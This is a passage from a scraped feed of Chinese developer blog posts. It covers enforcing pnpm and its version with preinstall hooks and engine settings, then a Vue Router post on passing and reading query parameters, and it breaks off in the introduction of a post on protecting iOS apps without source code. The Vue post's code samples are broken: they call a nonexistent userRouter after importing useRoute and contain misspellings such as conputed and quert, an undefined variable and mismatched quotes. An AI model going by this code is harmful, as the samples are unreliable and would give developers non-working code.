<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"packageManager"</span>: <span class="hljs-string">"pnpm@10.18.3"</span>
}
</code></pre>
<h4 data-id="heading-11">步骤二： <code>only-allow</code>（强制）</h4>
<p><code>npx only-allow pnpm</code>,<code>npx only-allow npm</code>,<code>npx only-allow yarn</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"preinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx only-allow pnpm"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>如果有其他脚本，建议把这个放在前面 <code>npx only-allow pnpm &amp;&amp; node scripts/check-node.js</code>，此时再用<code>pnpm</code>外的包管理工具可就不行了：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8fc8e0eba34041599f689507cc0f46ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=RWKm06vZW3T3EHPrQkcWM5QPrvM%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-12">步骤三：脚本约束（最终防线 可选）</h4>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">const</span> userAgent = process.env.npm_config_user_agent || <span class="hljs-comment">'';</span>
<span class="hljs-keyword">if</span> (!userAgent.includes(<span class="hljs-comment">'pnpm')) {</span>
  console.<span class="hljs-keyword">error</span>(<span class="hljs-comment">'❌ 请使用 pnpm 安装依赖');</span>
  console.<span class="hljs-keyword">error</span>(<span class="hljs-comment">'💡 运行: corepack enable &amp;&amp; pnpm install');</span>
  process.<span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>

<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"preinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx only-allow pnpm &amp;&amp; node scripts/check-node.js"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>暂时用<code>"preinstall": "node scripts/check-node.js"</code>查看报错：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ac5dd23ffdd4f6a9cc329bbaa88f82e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=ZXcOZtCKaR2ss35m7%2F1JiH2%2BlKk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">2.2. 包管理工具切换辅助 ❌</h3>
<p>我们没法辅助开发者切换npm/ pnpm /yarn,因为他们本来就不是项目级工具，而是系统级工具，开发者想用哪个用哪个（他尽管用，我们在约束环节已经拦截）</p>
<h2 data-id="heading-14">3. 指定包管理工具版本</h2>
<h3 data-id="heading-15">3.1. 约束</h3>
<h4 data-id="heading-16">3.1.1. npm 专有约束</h4>
<p>1️⃣ <code>package.json#npm</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&gt;=18 &lt;21"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"npm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"11.7.0"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>2️⃣ <code>.npmrc</code></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">engine-strict</span>=<span class="hljs-literal">true</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bde5ae5d44de497ba633c28926af08ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=RQeVDGakKRrfMxBEp3FcXk9YjmM%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-17">3.1.2. pnpm 专有约束</h4>
<p>1️⃣ package.json (声明）</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"engines"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"node"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&gt;=18 &lt;21"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"pnpm"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"9.1.1"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2322f7aa14cc4050a98d22499058cf5f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=ZNxaTgxeJL27MaR9StBduv1fJmw%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-18">3.1.3. 共享约束：脚本约束</h4>
<p>三个PM都可以用的约束，以 pnpm@10.28.2 为例</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> semver <span class="hljs-keyword">from</span> <span class="hljs-string">'semver'</span>;
<span class="hljs-keyword">import</span> { execSync } <span class="hljs-keyword">from</span> <span class="hljs-string">'child_process'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">REQUIRED</span> = <span class="hljs-string">'10.28.2'</span>;

<span class="hljs-keyword">const</span> current = <span class="hljs-title function_">execSync</span>(<span class="hljs-string">'pnpm -v'</span>).<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">trim</span>();

<span class="hljs-keyword">if</span> (!semver.<span class="hljs-title function_">eq</span>(current, <span class="hljs-variable constant_">REQUIRED</span>)) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`
❌ pnpm 版本不符合要求

当前版本: <span class="hljs-subst">${current}</span>
要求版本: <span class="hljs-subst">${REQUIRED}</span>
`</span>);
  process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">1</span>);
}
</code></pre>
<h3 data-id="heading-19">3.2. 包管理工具版本辅助切换</h3>
<h4 data-id="heading-20">3.2.1. pnpm 自身的版本管理</h4>
<pre><code class="hljs language-perl" lang="perl"> {
    <span class="hljs-string">"packageManager"</span>: <span class="hljs-string">"pnpm@10.28.0"</span>,
 }
</code></pre>
<p>pnpm 触发时，检查 <code>packageManager</code>字段，如果发现不一致会尝试下载并切换到<code>packageManager</code>指定的版本</p>
<h4 data-id="heading-21">3.2.2. yarn 依赖 <code>packageManager</code>+<code>corepack</code></h4>
<p>1️⃣ <code>corepack enable</code></p>
<p>Node.js 版本 ≥ 16.9 &lt;25 自带<code>corepack</code>，没有则先安装<code>corepack</code></p>
<p>2️⃣ 提供PM信息</p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"packageManager"</span>: <span class="hljs-string">"yarn@1.22.20"</span>,
}
</code></pre>
<p>3️⃣ 自动切换</p>
<p>使用PM时，<code>corepack</code>会读<code>packageManager</code>如果发现版本不一致，触发自动下载</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0711158a1192428fa174b1afea1eb8d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769159477&amp;x-signature=EHREUcuAdvBu0evvdgk3E9WOyFI%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>关于<code>corepack</code>可以解决用什么PM(packageManager 包管理工具)?什么PM 版本？</p>
<p>我持怀疑态度，理由如下</p>
<p><code>corepack</code> 出现的初衷本来就是为了统一PM的版本，而不是统一用户哪一个包版本工具，那都有人说它可以，那尝试一下硬着头皮用。</p>
<p>发现用它来指定PM需要：</p>
<ol>
<li>开发者本地存在<code>corepack</code>或Node.js 版本 ≥ 16.9 &lt;25（自带，也不完全自带，如果是 volta下载的，就不会带），且需要<code>corepack enable</code></li>
<li>无论 packageManager 配置了什么，都不限制 <code>npm install</code></li>
<li>只能限制 <code>corepack</code>下载的包版本工具，但哪个前端开发笔记本不安装几个包管理工具？</li>
</ol>
<p>发现用它来指PM版本也存在问题：</p>
<p>Corepack <strong>不管理 npm,</strong> 配置了<code>npm@10.25.0</code>但是任何版本的npm都会直接执行，不会下载指定版本</p>
<p>结论：❌ 多少有些不可靠，现在能想到的应用场景就只有辅助 yarn 版本切换了</p>
</blockquote>
<p>绕死我了！🙂‍↔️🙂‍↔️🙂‍↔️</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[跳转传参and接收参数]]></title>    <link>https://juejin.cn/post/7595615310180778038</link>    <guid>https://juejin.cn/post/7595615310180778038</guid>    <pubDate>2026-01-16T09:34:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595615310180778038" data-draft-id="7595502583269392420" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="跳转传参and接收参数"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-16T09:34:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="怪可爱的地球人"/> <meta itemprop="url" content="https://juejin.cn/user/4387527339288932"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            跳转传参and接收参数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4387527339288932/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    怪可爱的地球人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:34:59.000Z" title="Fri Jan 16 2026 09:34:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ul>
<li>route:读取当前路由信息（参数、查询参数、路径等）</li>
<li>router:进行路由跳转操作（push、replace、go等）</li>
</ul>
<ol>
<li>跳转</li>
</ol>
<pre><code class="hljs language-js" lang="js">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>()

<span class="hljs-comment">// 跳转到指定路径</span>
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/dashboard'</span>)

<span class="hljs-comment">// 带参数跳转</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'/dashboard'</span>, <span class="hljs-attr">query</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span> } })

<span class="hljs-comment">// 命名路由跳转</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'dashboard'</span>, <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span> } })

<span class="hljs-comment">// 替换当前路由</span>
router.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/dashboard'</span>)

<span class="hljs-comment">// 前进/后退</span>
router.<span class="hljs-title function_">go</span>(<span class="hljs-number">1</span>)
router.<span class="hljs-title function_">go</span>(-<span class="hljs-number">1</span>)
&lt;/script&gt;
</code></pre>
<ol start="2">
<li>读取：</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">1.</span>直接访问queryd对象

<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">userRouter</span>()

<span class="hljs-keyword">const</span> id = route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>

<span class="hljs-number">2.</span>使用computed响应式获取

<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">import</span> { conputed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">userRouter</span>()

<span class="hljs-keyword">const</span> userId = <span class="hljs-title function_">computed</span>(<span class="hljs-function">()=&gt;</span>route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>)

<span class="hljs-number">3.</span>获取多个参数

<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">userRouter</span>()

<span class="hljs-keyword">const</span> { id,name,type } = route.<span class="hljs-property">query</span>

<span class="hljs-number">4.</span>在页面中的生命周期里面接收参数

<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">import</span> { useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">userRouter</span>()

<span class="hljs-comment">//生命周期中的挂载后（最常用）</span>

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">()=&gt;</span>{

<span class="hljs-keyword">const</span> id = route.<span class="hljs-property">quert</span>.<span class="hljs-property">id</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"id"</span>,id)

})

<span class="hljs-number">5.</span>监听路由参数变化

<span class="hljs-keyword">import</span> { watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">import</span> {useRoute } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>

<span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>()

<span class="hljs-comment">//监听query参数变化</span>

<span class="hljs-title function_">watch</span>(

<span class="hljs-function">()=&gt;</span>route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>,

<span class="hljs-function">(<span class="hljs-params">newId,oldId</span>)=&gt;</span>{

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(阐述变化：<span class="hljs-string">',oldId,'</span>-&gt;<span class="hljs-string">',newId)

})

//监听所有query参数变化

watch(()=&gt;route.query,

(newQuery)=&gt;{

console.log('</span>所有参数变化<span class="hljs-string">'，newQuery)

},

{deep:true}

)

6.在模板中直接使用
&lt;div&gt;ID:{{$route.query.id}}&lt;/div&gt;

7.类型安全的方式

import { useRoute } from '</span>vue-router<span class="hljs-string">'

import { conputed } from '</span>vue<span class="hljs-string">'

const route = userRouter()

const query = computed(()=&gt;route.query.id as string | undefined)

if(query.value){
console.log('</span><span class="hljs-variable constant_">ID</span><span class="hljs-string">',queryId.value)
}

8.实际应用写在onMounted里面

</span></code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[没有源码的情况下，iOS 应用还能怎么做加密与保护]]></title>    <link>https://juejin.cn/post/7595837635569516596</link>    <guid>https://juejin.cn/post/7595837635569516596</guid>    <pubDate>2026-01-16T09:48:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595837635569516596" data-draft-id="7595755710733418511" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="没有源码的情况下，iOS 应用还能怎么做加密与保护"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-16T09:48:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我是谁的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/2390811467846089"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            没有源码的情况下，iOS 应用还能怎么做加密与保护
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2390811467846089/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我是谁的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T09:48:02.000Z" title="Fri Jan 16 2026 09:48:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在理想情况下，安全相关的事情都应该发生在源码阶段。
但现实项目里，经常会遇到一个并不“理想”的前提：<strong>手里只有 IPA，没有源码</strong>。</p>
<p>我第一次面对这个问题，是在一个已经上线的商业 App 上。项目并不是我最初参与开发的，能拿到的交付物只有已签名的安装包。那段时间讨论最多的一个问题是<strong>在这种前提下，还能不能做点什么，而不是完全放弃安全？</strong></p>
<hr/>
<h3 data-id="heading-0"><strong>没有源码并不等于完全无法处理</strong></h3>
<p>很多人听到没有源码这四个字，会直接把后面的可能性全部否定。
但站在项目角度看，IPA 本身就是一个完整的产物，里面包含了：</p>
<ul>
<li>可执行二进制</li>
<li>符号信息</li>
<li>资源文件</li>
<li>配置与结构</li>
</ul>
<p>无法做的，是源码级逻辑调整；
还能做的，是<strong>对现有结构进行再加工</strong>。</p>
<p>这两者的目标本来就不完全相同。</p>
<hr/>
<h3 data-id="heading-1"><strong>没有源码时，加密的重点要重新理解</strong></h3>
